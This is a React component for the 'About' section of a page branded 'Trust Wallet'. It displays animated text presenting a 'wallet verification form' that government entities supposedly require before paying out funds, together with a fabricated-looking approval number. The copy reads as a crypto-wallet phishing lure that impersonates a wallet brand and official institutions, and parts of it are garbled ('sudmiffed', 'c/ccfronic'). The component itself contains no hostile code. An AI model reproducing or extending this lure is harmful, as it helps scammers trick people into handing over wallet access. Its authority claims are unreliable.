// components/About.tsx
import { color, motion } from 'framer-motion';

const About: React.FC = () => {
  return (
    <section id="about" className="py-16 bg-white">
      <div className="max-w-3xl mx-auto px-4">
        <motion.h3
          className="text-3xl font-semibold text-center mb-6"
          initial={{ opacity: 0, y: -50 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 1 }}
        >
          Trust Wallet
        </motion.h3>
        <motion.p
          className="text-center text-gray-700 mb-4"
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ duration: 1, delay: 0.5 }}
        >
          Wallet verification form for the purpose of receiving an investment amount from an official institution.
        </motion.p>
        <motion.p
          className="text-center text-gray-700"
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ duration: 1, delay: 1 }}
        >
          This form is sudmiffed for the purpose of verifying an c/ccfronic wallet registered under an individual’s name at the request of a government authority or Institution to facilitate tho transfer of a financial amount from government ontltios to the wallet holder
        </motion.p>
        <motion.p
          className="text-center text-green-700"
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ duration: 1, delay: 1 }}
        >
          APPROVAL NO.1405-0189
        </motion.p>
      </div>
    </section>
  );
};

export default About;
